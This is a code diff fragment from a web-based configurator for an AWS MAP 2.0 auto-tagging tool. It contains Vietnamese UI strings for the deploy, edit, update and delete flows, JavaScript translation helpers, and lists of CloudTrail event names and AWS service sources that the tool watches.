+            ui_scp_tagging:'SCP gắn tag — đảm bảo SCP không từ chối tag:TagResources, ec2:CreateTags hoặc các hành động gắn tag khác cho Lambda execution role. deploy.sh sẽ chạy kiểm tra IAM simulation sau khi triển khai, nhưng SCP cần xác minh thủ công trong AWS Organizations Console.',
+            ui_scp_mandatory:'SCP gắn tag bắt buộc — nếu SCP yêu cầu tag phải có khi tạo resource, giải pháp này sẽ không đáp ứng yêu cầu đó (tag được áp dụng 60-90 giây sau khi tạo). Khách hàng phải miễn trừ tag key map-migrated hoặc sử dụng khoảng thời gian ân hạn.',
+            rv_not_specified:'(chưa chỉ định)', rv_none:'(không có)', rv_none_specified:'(chưa chỉ định)',
+            rv_yes:'Có', rv_no:'Không', rv_disabled:'Đã tắt', rv_enabled:'Đã bật',
+            rv_multi_method:'Phương thức đa tài khoản', rv_stackset:'StackSet (Lambda mỗi tài khoản)', rv_central:'Lambda trung tâm (đa tài khoản)',
+            rv_target_accounts:'Tài khoản mục tiêu', rv_tag_non_vpc:'Gắn tag dịch vụ không thuộc VPC',
+            rv_all_resources:'Tất cả resource trong tài khoản mục tiêu',
+            rv_backfill_enabled:'Đã bật — gắn tag resource hiện có từ ngày bắt đầu thỏa thuận (~5 phút sau triển khai)',
+            rv_desc_single:'Một CloudFormation stack. Triển khai trực tiếp vào tài khoản của khách hàng:',
+            rv_desc_stackset:'Tạo hai file. Triển khai template tài khoản quản lý một lần — tự động phát hiện cấu trúc org và cấp phát cho các tài khoản đã chỉ định:',
+            rv_desc_central:'Lambda trung tâm trong một tài khoản + IAM role đa tài khoản trong mỗi tài khoản thành viên:',
+            rv_deploy_mgmt:'triển khai vào tài khoản quản lý', rv_deploy_accounts:'tải lên S3, triển khai vào mỗi tài khoản',
+            rv_targets:'Mục tiêu', rv_specific_accounts:'tài khoản cụ thể', rv_targets_all:'Mục tiêu là TẤT CẢ tài khoản trong tổ chức',
+            rv_res_lambda:'Hàm AWS Lambda', rv_res_lambda_desc:'Tự động gắn tag resource mới trong vòng 60-90 giây sau khi tạo',
+            rv_res_eventbridge:'Quy tắc Amazon EventBridge', rv_res_eventbridge_desc:'Bắt 200+ sự kiện Create/Run/Put/Publish trên tất cả dịch vụ',
+            rv_res_ssm:'Tham số AWS Systems Manager', rv_res_ssm_desc:'Lưu trữ MAP ID, ngày thỏa thuận, cấu hình phạm vi',
+            rv_res_iam:'Vai trò IAM', rv_res_iam_desc:'100+ quyền gắn tag đặc thù theo dịch vụ, quyền tối thiểu',
+            rv_res_dlq:'Hàng đợi chết Amazon SQS', rv_res_dlq_desc:'Bắt các sự kiện gắn tag thất bại để thử lại/kiểm tra',
+            rv_res_sns:'Amazon SNS Topic + Amazon CloudWatch Alarm', rv_res_sns_desc:'Thông báo khi có lỗi gắn tag (>3 lỗi trong 5 phút)',
+            rv_res_custom:'Custom Resource (Lambda)', rv_res_custom_desc:'Tự động tìm ID root OU khi triển khai — khách hàng không cần làm gì',
+            err_mpe_invalid:"MAP ID phải có đúng 10 ký tự, chỉ dùng chữ hoa tiếng Anh (A–Z) và chữ số (0–9), và phải có ít nhất một chữ cái và một chữ số",
+            ui_landing_title:'Bạn muốn làm gì?',
+            ui_landing_subtitle:'Chọn một tùy chọn để bắt đầu',
+            ui_mode_deploy_title:'Triển khai MAP Auto-Tagger mới',
+            ui_mode_deploy_desc:'Tạo script triển khai cho engagement MAP 2.0 mới. Hỗ trợ triển khai một tài khoản và nhiều tài khoản (AWS Organizations).',
+            ui_mode_edit_title:'Chỉnh sửa triển khai hiện có',
+            ui_mode_edit_desc:'Thêm hoặc xóa tài khoản AWS khỏi phạm vi MAP Auto-Tagger đã được triển khai. Tạo script cập nhật — không cần triển khai lại.',
+            ui_mode_edit_note:'Chỉ dành cho triển khai nhiều tài khoản (AWS Organizations)',
+            ui_estep1:'1. Cấu hình', ui_estep2:'2. Xem lại', ui_estep3:'3. Tải xuống',
+            ui_editor_info:'Công cụ này chỉnh sửa triển khai hiện có được tạo bởi MAP Auto-Tagger Configurator. Nó tạo script update.sh để cập nhật phạm vi tài khoản mà không cần triển khai lại.',
+            ui_editor_step1_title:'Chi tiết Triển khai',
+            ui_editor_step1_subtitle:'Nhập chi tiết của triển khai MAP Auto-Tagger hiện có của bạn',
+            ui_editor_mpe_hint:'— mã chữ và số 10 ký tự, phải khớp với triển khai gốc',
+            ui_editor_region:'Vùng Triển khai',
+            ui_editor_region_hint:'— vùng nơi management stack được triển khai',
+            ui_editor_region_placeholder:'Chọn vùng...',
+            err_editor_region:'Vui lòng chọn vùng triển khai',
+            ui_editor_action_title:'Hành động',
+            ui_editor_action_subtitle:'Chọn thêm hoặc xóa tài khoản khỏi phạm vi MAP',
+            ui_editor_add_title:'Thêm tài khoản vào phạm vi MAP',
+            ui_editor_add_desc:'Các tài khoản được chọn sẽ bắt đầu được gắn tag MAP.',
+            ui_editor_add_accounts_label:'ID tài khoản cần thêm',
+            ui_editor_add_accounts_hint:'— chỉ các tài khoản chưa có trong phạm vi',
+            err_editor_account:'Vui lòng nhập ít nhất một ID tài khoản 12 chữ số hợp lệ',
+            ui_editor_backfill_title:'Chạy lại backfill cho các tài khoản mới thêm',
+            ui_editor_backfill_desc:'Truy vấn lịch sử CloudTrail từ ngày bắt đầu thỏa thuận và gắn tag tài nguyên hiện có trong các tài khoản mới thêm. Tự động chạy trong quá trình cập nhật StackSet. Kết quả xuất hiện trong CloudWatch Logs (map-auto-tagger-backfill).',
+            ui_editor_backfill_note:'Lưu ý: Lịch sử CloudTrail giới hạn trong 90 ngày gần nhất. Tài nguyên được tạo trước khoảng thời gian đó phải được gắn tag thủ công.',
+            ui_editor_remove_title:'Xóa tài khoản khỏi phạm vi MAP',
+            ui_editor_remove_desc:'Các tài khoản được chọn sẽ ngừng được gắn tag. Tag hiện có không bị xóa. Lambda vẫn được triển khai nhưng không hoạt động cho các tài khoản này.',
+            ui_editor_remove_accounts_label:'ID tài khoản cần xóa',
+            ui_editor_remove_accounts_hint:'— chỉ các tài khoản đang có trong phạm vi',
+            ui_mode_update_title:'Cập nhật lên phiên bản template mới nhất',
+            ui_mode_update_desc:'Nâng cấp mã Lambda, chính sách IAM và quy tắc EventBridge lên phiên bản template hiện tại. Cấu hình phạm vi (tài khoản, VPC, ngày thỏa thuận) được giữ nguyên. Tự động phát hiện triển khai đơn tài khoản và đa tài khoản.',
+            ui_ustep1:'1. Cấu hình',
+            ui_ustep2:'2. Xem lại',
+            ui_ustep3:'3. Tải xuống',
+            ui_update_info:'Công cụ này nâng cấp một triển khai MAP Auto-Tagger hiện có lên phiên bản template mới nhất. Tạo tập lệnh <code>update.sh</code> giữ nguyên cấu hình phạm vi và tự động phát hiện triển khai đơn tài khoản và đa tài khoản.',
+            ui_update_step1_title:'Chi tiết Triển khai',
+            ui_update_step1_subtitle:'Nhập region và phạm vi tùy chọn cho việc nâng cấp',
+            ui_update_info_detail:'Tập lệnh <code>update.sh</code> được tạo sẽ đọc phiên bản template hiện tại từ SSM Parameter Store (<code>/auto-map-tagger/&lt;mpe&gt;/version</code>), so sánh với phiên bản mục tiêu và từ chối nâng cấp vượt phiên bản lớn (ví dụ v19 → v21) nếu không có <code>--force</code>. Theo SemVer, chỉ bản nâng cấp MAJOR mới yêu cầu thao tác của khách hàng.',
+            ui_update_scope_title:'Chỉ cập nhật MAP engagement cụ thể',
+            ui_update_scope_desc:'Bỏ chọn để cập nhật mọi triển khai MAP Auto-Tagger mà tập lệnh tìm thấy trong tài khoản này (cả stack và stackset khớp với <code>map-auto-tagger-mig*</code>).',
+            ui_update_mpe_label:'MPE ID cần cập nhật',
+            ui_update_mpe_hint:'— mỗi MPE phải khớp với một MAP Auto-Tagger đã triển khai trong region này',
+            ui_update_add_mpe:'+ Thêm MPE khác',
+            err_update_mpe:'Vui lòng nhập ít nhất một MPE ID 10 ký tự hợp lệ',
+            ui_update_scope_review:'Phạm vi cập nhật',
+            ui_update_all_review:'tất cả triển khai MAP Auto-Tagger trong tài khoản này',
+            ui_update_target_version:'Phiên bản template mục tiêu',
+            ui_update_confirm_text:'Tôi xác nhận rằng các triển khai MAP Auto-Tagger được liệt kê tồn tại trong region đã chọn và việc nâng cấp lên phiên bản template mục tiêu là chủ ý.',
+            ui_update_confirm_risk:'Nâng cấp sẽ thay thế mã Lambda, chính sách IAM và quy tắc EventBridge trong mọi stack khớp. Phạm vi và ngày thỏa thuận được giữ nguyên qua <code>--use-previous-parameters</code>, nhưng một rollout thất bại có thể khiến stack ở trạng thái UPDATE_ROLLBACK_COMPLETE và cần khôi phục thủ công.',
+            err_update_confirm:'Bạn phải xác nhận trước khi tạo tập lệnh cập nhật',
+            ui_update_step3_subtitle:'Chạy trong AWS CloudShell từ tài khoản nơi đã triển khai',
+            ui_mode_delete_title:'Xóa triển khai hiện có',
+            ui_mode_delete_desc:'Gỡ các triển khai MAP Auto-Tagger khỏi tài khoản. Mặc định xóa mọi stack và stackset map-auto-tagger-mig* trong region; có thể giới hạn theo MPE cụ thể. Thẻ map-migrated không bị gỡ khỏi các resource đã được gắn thẻ.',
+            ui_dstep1:'1. Cấu hình',
+            ui_dstep2:'2. Xem lại',
+            ui_dstep3:'3. Tải xuống',
+            ui_delete_info:'Công cụ này gỡ các triển khai MAP Auto-Tagger khỏi tài khoản của bạn. Nó tạo ra script delete.sh tự động phát hiện stack đơn tài khoản và StackSet đa tài khoản. Mặc định, mọi triển khai map-auto-tagger-mig* trong region được chọn sẽ bị gỡ. Thẻ map-migrated không bị gỡ khỏi các resource đã được gắn thẻ — các thẻ đó vẫn còn để tín dụng MAP được giữ nguyên.',
+            ui_delete_step1_title:'Chi tiết triển khai',
+            ui_delete_step1_subtitle:'Chọn region để xóa',
+            ui_delete_scope_title:'Giới hạn theo MAP engagement (MPE) cụ thể',
+            ui_delete_scope_desc:'Không chọn để xóa mọi triển khai MAP Auto-Tagger tìm thấy trong region này (cả stack và stackset khớp với map-auto-tagger-mig*).',
+            ui_delete_scope_all:'Tất cả triển khai map-auto-tagger-mig* trong region này',
+            ui_delete_scope_specific:'MPE cụ thể',
+            ui_delete_mpe_label:'ID MPE cần xóa',
+            ui_delete_mpe_hint:'— mỗi MPE phải khớp với MAP Auto-Tagger đã triển khai trong region này',
+            ui_delete_add_mpe:'+ Thêm MPE khác',
+            err_delete_mpe:'ID MAP Engagement phải có đúng 10 ký tự, chỉ gồm chữ in hoa tiếng Anh (A–Z) và chữ số (0–9), với ít nhất một chữ cái và một chữ số',
+            ui_delete_optin_title:'Tùy chọn — CloudWatch Log Groups',
+            ui_delete_optin_logs:'Xóa CloudWatch Log Groups',
+            ui_delete_optin_logs_hint:'— xóa lịch sử kiểm toán. Mặc định log được giữ lại.',
+            ui_delete_optin_bucket:'S3 staging bucket',
+            ui_delete_bucket_conditional:'Chỉ xóa khi không còn triển khai nào khác',
+            ui_delete_bucket_yes:'Có — sẽ không còn triển khai nào',
+            ui_delete_bucket_note:'S3 staging bucket được xử lý tự động: chỉ xóa khi không còn triển khai MAP Auto-Tagger nào khác trong tài khoản.',
+            ui_delete_review_subtitle:'Xác nhận những gì sẽ bị xóa',
+            ui_delete_confirm_title:'⚠️ Gõ DELETE để xác nhận',
+            ui_delete_confirm_hint:'Hành động này xóa các resource CloudFormation. Các thẻ map-migrated hiện có trên resource AWS được giữ nguyên, nhưng Lambda sẽ ngay lập tức ngừng gắn thẻ cho resource mới.',
+            ui_delete_confirm_label:'Gõ từ DELETE để xác nhận',
+            err_delete_confirm:'Gõ từ "DELETE" để tiếp tục',
+            ui_delete_generate:'Tạo delete.sh →',
+            ui_delete_download:'⬇ Tải xuống delete.sh',
+            ui_delete_step3_subtitle:'Chạy trong AWS CloudShell từ tài khoản nơi đã triển khai',
+            d_instr_title:'HƯỚNG DẪN XÓA — MAP Auto-Tagger',
+            d_instr_region_label:'Region:',
+            d_instr_scope_label:'Phạm vi:',
+            d_instr_version_label:'Phiên bản template:',
+            d_instr_scope_specific:'MPE —',
+            d_instr_scope_all:'tất cả triển khai MAP Auto-Tagger trong region này',
+            d_instr_opt1:'Tùy chọn 1: AWS CloudShell (Khuyến nghị)',
+            d_instr_opt1_step1:'1. Đăng nhập AWS Console cho tài khoản nơi đã triển khai.\n   (Với triển khai đa tài khoản, đây là tài khoản quản lý.)',
+            d_instr_opt1_step2:'2. Mở CloudShell.',
+            d_instr_opt1_step3:'3. Tải lên delete.sh và chạy:',
+            d_instr_opt2:'Tùy chọn 2: AWS CLI cục bộ',
+            d_instr_opt2_step1:'1. Đảm bảo AWS CLI v2 đã cài đặt và cấu hình với thông tin đăng nhập quản trị viên.',
+            d_instr_opt2_step2:'2. Chạy: bash delete.sh',
+            d_instr_what_title:'Script làm gì:',
+            d_instr_what_scoped:'Tìm Stack hoặc StackSet của từng MPE được liệt kê và xóa chúng.',
+            d_instr_what_all:'Liệt kê mọi Stack và StackSet map-auto-tagger-mig* trong region và xóa chúng.',
+            d_instr_what_stackset:'Với StackSet: xóa các stack instance song song (sai số 100%), rồi xóa StackSet.',
+            d_instr_what_stack:'Với Stack: chạy delete-stack và chờ hoàn thành.',
+            d_instr_what_bucket:'Chỉ xóa S3 staging bucket khi không còn triển khai MAP Auto-Tagger nào trong region. Ngược lại giữ lại để không phá vỡ các triển khai khác.',
+            d_instr_logs_delete:'Xóa các CloudWatch Log Groups khớp.',
+            d_instr_logs_preserve:'CloudWatch Log Groups (giữ lịch sử kiểm toán).',
+            d_instr_preserved_title:'Được giữ lại (không bao giờ xóa):',
+            d_instr_preserved_tags:'Thẻ map-migrated trên resource AWS (tín dụng MAP được giữ nguyên).',
+            d_instr_preserved_iam:'Vai trò IAM quản trị và thực thi StackSet (khung tổ chức dùng chung).',
+            d_instr_idempotent:'Idempotent: an toàn để chạy lại. Các resource thiếu được báo cáo là bị bỏ qua, không phải thất bại.',
+            ui_version_history_title:'Lịch sử phiên bản — có gì thay đổi?',
+            ui_version_released:'Ngày phát hành',
+            ui_version_current:'Phiên bản mục tiêu hiện tại',
+            ui_version_full_changelog:'Nhật ký thay đổi đầy đủ trên GitHub',
+            ui_version_tag_bugfix:'Sửa lỗi',
+            ui_version_tag_coverage:'Phạm vi mới',
+            ui_version_tag_breaking:'Thay đổi lớn',
+            ui_version_tag_security:'Bảo mật',
+            ui_version_tag_perf:'Hiệu năng',
+            ui_version_tag_other:'Khác',
+            ui_editor_back:'← Quay lại',
+            ui_editor_review:'Xem lại →',
+            ui_editor_review_title:'Xem lại Cấu hình',
+            ui_editor_review_subtitle:'Xác minh cài đặt của bạn trước khi tạo script cập nhật',
+            ui_editor_review_accounts:'Tài khoản',
+            ui_editor_confirm_text:'Tôi xác nhận rằng MAP Auto-Tagger đã được triển khai ở vùng đã chọn với MPE ID được chỉ định, và cả hai giá trị đều chính xác.',
+            ui_editor_confirm_risk:'Tạo và chạy script này với thông tin không chính xác có thể cập nhật sai StackSet, làm hỏng phạm vi tài khoản, hoặc khiến tài nguyên được gắn tag với MAP engagement ID sai — dẫn đến mất tín dụng MAP không thể phục hồi.',
+            err_editor_confirm:'Bạn phải xác nhận trước khi tạo script cập nhật',
+            ui_editor_generate:'Tạo update.sh →',
+            ui_editor_step3_title:'Script Đã Sẵn Sàng',
+            ui_editor_step3_subtitle:'Chạy trong AWS CloudShell từ tài khoản quản lý',
+            ui_editor_download:'⬇ Tải xuống update.sh',
+            ui_editor_script_preview:'Xem trước Script',
+            err_date_required:'Vui lòng nhập ngày bắt đầu thỏa thuận',
+            err_date_end:'Ngày kết thúc phải sau ngày bắt đầu',
+            err_vpc_required:'Vui lòng nhập ít nhất một VPC ID.',
+            err_vpc_format:'Định dạng VPC ID không hợp lệ. Phải là vpc- theo sau bởi 8-17 ký tự hex (ví dụ: vpc-0abc1234def56789).',
+            err_duplicate_vpc:'Phát hiện VPC ID trùng lặp. Vui lòng xóa các mục trùng.',
+            err_central_account_required:'Vui lòng nhập ID tài khoản trung tâm (12 chữ số).',
+            d_title:'Cài đặt MAP 2.0 Auto-Tagger',
+            d_tag_label:'Giá trị Tag', d_region_label:'Region', d_account_label:'Tài khoản',
+            d_step1:'Bước 1/3: Đang kiểm tra tài khoản của bạn...',
+            d_step2:'Bước 2/3: Đang cài đặt auto-tagger...',
+            d_step2_wait:'(Thường mất 1-2 phút)',
+            d_step2_wait_multi:'(Thường mất 10-15 phút)',
+            d_step3:'Bước 3/3: Đang lưu báo cáo triển khai...',
+            d_ok_creds:'Đã kết nối thành công với tài khoản AWS.',
+            d_fail_creds:'Không thể kết nối với tài khoản AWS của bạn.',
+            d_fix_creds:'Phiên làm việc của bạn có thể đã hết hạn. Đóng và mở lại AWS CloudShell, sau đó chạy lại script này.',
+            d_ok_trail:'Ghi nhật ký hoạt động đã được bật trong Region:',
+            d_fail_trail:'Ghi nhật ký hoạt động (CloudTrail) chưa được bật trong Region:',
+            d_fix_trail1:'Vào AWS Console → CloudTrail → Tạo trail.',
+            d_fix_trail2:'Đảm bảo bao gồm Region:',
+            d_ok_perms:'Quyền triển khai đã sẵn sàng.',
+            d_fail_perms:'Tài khoản của bạn không có quyền triển khai cần thiết.',
+            d_fix_perms:'Yêu cầu quản trị viên AWS cấp quyền AWS CloudFormation, IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS và Amazon CloudWatch.',
+            d_ok_org:'Đang chạy từ tài khoản đúng (tài khoản quản lý hoặc quản trị viên được ủy quyền).',
+            d_ok_org_delegated:'Đang chạy với tư cách quản trị viên được ủy quyền cho CloudFormation StackSets.',
+            d_fail_org:'Script này phải chạy từ tài khoản quản lý của tổ chức hoặc tài khoản quản trị viên được ủy quyền cho CloudFormation StackSets.',
+            d_fix_org:'Chuyển sang tài khoản quản lý (hoặc tài khoản quản trị viên được ủy quyền) trong AWS CloudShell và chạy lại script. Nếu không chắc, hãy liên hệ với đội AWS của bạn.',
+            d_warn_stacksets:'Tích hợp triển khai đa tài khoản chưa được kích hoạt — sẽ được thiết lập tự động trong quá trình triển khai.',
+            d_ok_stacksets:'Tích hợp triển khai đa tài khoản đã được kích hoạt.',
+            d_ok_scp:'Không có chính sách bảo mật nào chặn dịch vụ tag.',
+            d_ok_vpc:'VPC tồn tại trong tài khoản này:',
+            d_fail_vpc:'Không tìm thấy VPC trong tài khoản/vùng này:',
+            d_fix_vpc:'Xác minh ID VPC chính xác và tồn tại trong tài khoản và vùng mục tiêu.',
+            d_ok_account_scope:'Tài khoản tồn tại trong tổ chức:',
+            d_fail_account_scope:'Không tìm thấy tài khoản trong tổ chức:',
+            d_fix_account_scope:'Xác minh ID tài khoản là tài khoản 12 chữ số hợp lệ thuộc tổ chức AWS của bạn.',
+            d_fail_scp:'Chính sách bảo mật trong tổ chức của bạn đang chặn dịch vụ tag.',
+            d_fix_scp:"Liên hệ nhóm bảo mật AWS để cho phép hành động 'tag:TagResources' cho Lambda execution role.",
+            d_scp_note:"(Lưu ý: nếu tổ chức yêu cầu tag phải có khi tạo resource, hãy yêu cầu nhóm bảo mật miễn trừ tag key 'map-migrated'.)",
+            d_all_passed:'Tất cả các kiểm tra đã thông qua.',
+            d_checks_failed:'kiểm tra thất bại. Hãy làm theo các bước trên, sau đó chạy lại script.',
+            d_fix_label:'→ Cách khắc phục:',
+            d_deploying:'Đang triển khai. Bạn có thể nhấn Ctrl+C an toàn — quá trình sẽ tiếp tục trong nền.',
+            d_still_deploying:'Vẫn đang cài đặt...',
+            d_elapsed:'đã trôi qua',
+            d_deploy_failed:'Cài đặt thất bại. Vui lòng chia sẻ báo cáo dưới đây với nhóm tài khoản AWS của bạn.',
+            d_complete_title:'Cài đặt hoàn tất!',
+            d_complete_single:'Resource mới sẽ tự động được gắn tag trong vòng 1-2 phút sau khi tạo (tối đa 15 phút trong giờ cao điểm).',
+            d_complete_multi:'Tính năng tự động gắn tag hiện đã hoạt động trên tất cả tài khoản trong tổ chức.',
+            d_backfill_msg:'Backfill sẽ chạy ngay sau đây.',
+            d_backfill_waiting:'Đang chờ backfill hoàn tất...',
+            d_backfill_wait_info:'(Backfill sẽ bắt đầu ngay, có thể mất tối đa 15 phút)',
+            d_backfill_starting:'Backfill đang chạy...',
+            d_backfill_in_progress:'Đang thực hiện backfill...',
+            d_backfill_timeout:'Backfill vẫn đang chạy. Báo cáo đã được lưu — kiểm tra CloudWatch để xem kết quả cuối cùng:  aws logs tail /aws/lambda/map-auto-tagger-backfill',
+            d_backfill_done:'Backfill hoàn tất.',
+            r_backfill_result:'Kết quả Backfill',
+            d_backfill_since:'Nó sẽ gắn tag cho các resource được tạo từ:',
+            d_report_saved:'Báo cáo triển khai đã được lưu tại:',
+            d_share_report:'Chia sẻ file này với nhóm tài khoản AWS của bạn.',
+            r_title:'MAP 2.0 Auto-Tagger — Báo cáo Triển khai',
+            r_customer:'Khách hàng', r_mpe:'MPE ID', r_region:'Region', r_account:'Tài khoản',
+            r_date:'Ngày / Giờ', r_result:'Kết quả',
+            r_preflight:'Kết quả kiểm tra trước:',
+            r_deployed:'Những gì đã được triển khai:',
+            r_verify:'Cách xác minh:',
+            r_backfill:'Trạng thái backfill:',
+            r_perstatus:'Trạng thái từng tài khoản:',
+            r_support:'Hỗ trợ:',
+            r_action:'Hành động cần thực hiện:',
+            r_verify1:'1. Tạo bất kỳ resource nào trong tài khoản AWS của bạn',
+            r_verify2:'2. Chờ 1-2 phút (tối đa 15 phút trong giờ cao điểm)',
+            r_verify3:'3. Kiểm tra resource có tag: map-migrated =',
+            r_share_help:'Chia sẻ báo cáo này với nhóm tài khoản AWS của bạn nếu cần hỗ trợ.',
+            r_contact:'Liên hệ nhóm tài khoản AWS của bạn nếu c��n hỗ trợ.',
+            r_action_desc:'Vui lòng giải quyết các kiểm tra thất bại ở trên rồi chạy lại deploy.sh.'
+          }
+        };
+
+        function t(key) {
+            return (TRANSLATIONS[currentLang] && TRANSLATIONS[currentLang][key])
+                || TRANSLATIONS['en'][key] || key;
+        }
+
+        function setLanguage(lang) {
+            currentLang = lang;
+            // Update active flag
+            Object.keys(LANG_LABELS).forEach(l => {
+                const el = document.getElementById('lang-' + l);
+                if (el) el.classList.toggle('active', l === lang);
+            });
+            document.documentElement.lang = lang === 'zh' ? 'zh-CN' : lang;
+            applyTranslations();
+        }
+
+        function applyTranslations() {
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                el.textContent = t(key);
+            });
+            // Regenerate review table if on Step 2 (dynamically generated, no data-i18n)
+            const step2 = document.getElementById('step2');
+            if (step2 && !step2.classList.contains('hidden')) {
+                reviewConfig();
+            }
+            // Same for the Delete flow's Review step (dstep2)
+            const dstep2 = document.getElementById('dstep2');
+            if (dstep2 && !dstep2.classList.contains('hidden') && window._deleteReview) {
+                deleteRenderReview(window._deleteReview);
+            }
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.getAttribute('data-i18n-placeholder');
+                el.placeholder = t(key);
+            });
+            // Regenerate instructions preview if on Step 3
+            if (window._generated) {
+                const instrEl = document.getElementById('instructions');
+                if (instrEl && instrEl.textContent) {
+                    instrEl.textContent = generateInstructions(window._generated.config);
+                }
+            }
+            // Delete-flow Step 3 instructions are also dynamic — re-render if visible
+            const dstep3 = document.getElementById('dstep3');
+            if (dstep3 && !dstep3.classList.contains('hidden') && window._deleteReview) {
+                const instrEl = document.getElementById('delete-instructions');
+                if (instrEl && instrEl.textContent) {
+                    instrEl.textContent = deleteBuildInstructions(window._deleteReview);
+                }
+            }
+            // Re-render version history with translated labels if visible
+            const vhHost = document.getElementById('update-versionHistoryContent');
+            if (vhHost && vhHost.innerHTML) {
+                vhHost.innerHTML = renderVersionHistory();
+            }
+        }
+
+        // Complete list of event names (200+ proven events)
+        const ALL_EVENT_NAMES = [
+            'RunInstances','CreateVolume','CreateBucket','CreateDBInstance','CreateDBCluster',
+            'CreateTable','CreateFunction20150331','CreateLoadBalancer','CreateCluster','CreateService',
+            'CreateTopic','CreateQueue','CreateFileSystem','CreateCacheCluster','CreateReplicationGroup',
+            'CreateDomain','RunJobFlow','CreateStream','CreateDeliveryStream','CreateBroker',
+            'CreateRepository','CreateRestApi','CreateApi','CreateJob','CreateCrawler','CreateDatabase',
+            'CreateStateMachine','CreateKey','CreateSecret','CreateNotebookInstance','CreateEndpoint',
+            'CreateTrainingJob','CreateDistribution','CreateReplicationInstance','CreateReplicationTask',
+            'CreateFirewall','CreateFirewallPolicy','CreateServer','CreateWorkspaces','CreateHostedZone',
+            'ActivateGateway','CreateFleet','CreateImageBuilder','CreateDirectory','CreateMicrosoftAD',
+            'RequestCertificate','CreateGraphqlApi','CreateProject','CreatePipeline','CreateBackupVault',
+            'CreateBackupPlan','CreateLogGroup','CreateUserPool','CreateIdentityPool','CreateApplication',
+            'CreateMemory','CreateAgentRuntime','CreateKey','CreateCoreNetwork','CreateGlobalNetwork',
+            'CreateServiceNetwork','CreateService','CreateWorkspaceInstance',
+            'CreateKeyspace','CreateDatastore','EnableSecurityHub','CreateOpsItem',
+            'CreateIndex','CreateChannel','CreateInput','CreateEnvironment','CreateApp','CreateSequenceStore',
+            'CreateRunGroup','CreateWorkgroup','CreateNamespace','CreateDocumentClassifier',
+            'CreateEntityRecognizer','CreateConnection','CreateHsm','CreateVault','CreateSnapshot',
+            'CopySnapshot','CreateImage','CopyImage','ImportImage','ImportSnapshot',
+            'CreateCapacityReservation','CreateDBInstanceReadReplica','CreateDBSnapshot',
+            'CreateDBClusterSnapshot','CopyDBSnapshot','CopyDBClusterSnapshot',
+            'RestoreDBInstanceFromDBSnapshot','RestoreDBInstanceToPointInTime',
+            'RestoreDBClusterFromSnapshot','RestoreDBClusterToPointInTime','CreateGlobalCluster',
+            'CreateClusterSnapshot','RestoreFromClusterSnapshot','CreateVpc','CreateSubnet',
+            'CreateNatGateway','CreateTransitGateway','CreateTransitGatewayVpcAttachment',
+            'CreateVpcEndpoint','AllocateAddress','CreateClientVpnEndpoint','CreateVpnGateway',
+            'CreateVpnConnection','RunTask','CreateProcessingJob','CreateTransformJob',
+            'CreateModel','CreateEndpointConfig','PutMetricAlarm','RunScheduledInstances',
+            'CreateInferenceProfile','CreateModelCustomizationJob','CreateAgent','CreateKnowledgeBase',
+            'CreateGuardrail','CreateFlow','CreatePrompt','CreateProvisionedModelThroughput',
+            'CreateModelImportJob','CreateModelInvocationJob','CreateEvaluationJob','CreatePromptRouter',
+            'CreateNodegroup','CreateFargateProfile','CreateStorageVirtualMachine',
+            'CreateAgentAlias','CreateDataSource','CreateAgentActionGroup','CreateSnapshots',
+            'CreateDashboard','CreateAnalysis','CreateDataSet','RegisterUser',
+            'CreateComputeEnvironment','CreateReplicationGroup','CreateCacheCluster',
+            'CreateActivity','CreateStateMachine',
+            'CreateAccelerator','PublishLayerVersion20181031','CreateAlias20150331',
+            'CreateAddon','CreateTransitGatewayVpcAttachment','CreateFlowLogs',
+            'CreateUserPool','CreateIdentityPool',
+            'CreateConfigurationProfile',
+            'CreateFirewallPolicy','CreateFirewall',
+            'CreateWebACL','CreateIPSet','CreateDeploymentGroup',
+            'PutParameter','PutRule','PutDashboard','PutQueryDefinition',
+            'CreateAutoScalingGroup','CreateSecurityGroup','CreateInternetGateway',
+            'CreateRouteTable','CreateNetworkAcl','CreateNetworkInterface',
+            'CreateDhcpOptions','CreatePlacementGroup','CreateEgressOnlyInternetGateway',
+            'CreateCustomerGateway','CreateCarrierGateway','CreateKeyPair',
+            'CreateVpcPeeringConnection','CreateVpcLink','CreateLaunchTemplate',
+            'CreateTargetGroup','CreateStack','CreateStackSet',
+            'CreateCollection','CreateWorkGroup','CreateWorkflow','CreateTrigger',
+            'CreateDataset','CreateRecipe',
+            'CreateCertificateAuthority','CreateResourceShare',
+            'CreateDBProxy','CreateHealthCheck','CreateDocument',
+            'CreateHttpNamespace',
+            'CreateTapePool','CreatePortfolio','CreateMesh',
+            'CreateInstance','CreateBuild','CreateScript','CreateTask',
+            'CreateApiKey',
+            'CreateClusterV2','CreateServerlessCache',
+            'RestoreTableFromBackup','RestoreTableToPointInTime',
+            'CreateReplicationConfig','CreateDataProvider','CreateMigrationProject',
+            'CreateConnector','CreateUser',
+            'CreateLag','CreateDirectConnectGateway',
+            'CreateFarm','CreateQueue',
+            'CreateAsset','CreateAssetModel','CreateGateway','CreatePortal',
+            'CreateTopicRule',
+            'CreateSourceServer',
+            'CreateDomain',
+            'ConnectDirectory'
+        ];
+
+        const ALL_SOURCES = [
+            'aws.ec2','aws.s3','aws.rds','aws.dynamodb','aws.lambda','aws.elasticloadbalancing',
+            'aws.ecs','aws.sns','aws.sqs','aws.eks','aws.elasticfilesystem','aws.elasticache',
+            'aws.redshift','aws.es','aws.fsx','aws.kafka','aws.elasticmapreduce','aws.kinesis',
+            'aws.firehose','aws.mq','aws.ecr','aws.apigateway','aws.glue','aws.states',
+            'aws.kms','aws.secretsmanager','aws.sagemaker','aws.cloudfront','aws.dms',
+            'aws.network-firewall','aws.transfer','aws.workspaces','aws.timestream',
+            'aws.datasync','aws.route53','aws.storagegateway','aws.memorydb','aws.cassandra',
+            'aws.appstream','aws.ds','aws.acm','aws.appsync','aws.codebuild','aws.codepipeline',
+            'aws.backup','aws.logs','aws.cognito-idp','aws.cognito-identity','aws.kinesisanalytics',
+            'aws.gamelift','aws.kendra','aws.mediaconvert','aws.medialive','aws.mediapackage',
+            'aws.m2','aws.resiliencehub','aws.finspace','aws.omics','aws.redshift-serverless',
+            'aws.comprehend','aws.directconnect','aws.cloudhsm','aws.glacier','aws.bedrock',
+            'aws.bedrock-agent','aws.quicksight',
+            'aws.securityhub',
+            'aws.athena',
+            'aws.servicecatalog','aws.ram','aws.acm-pca','aws.aoss',
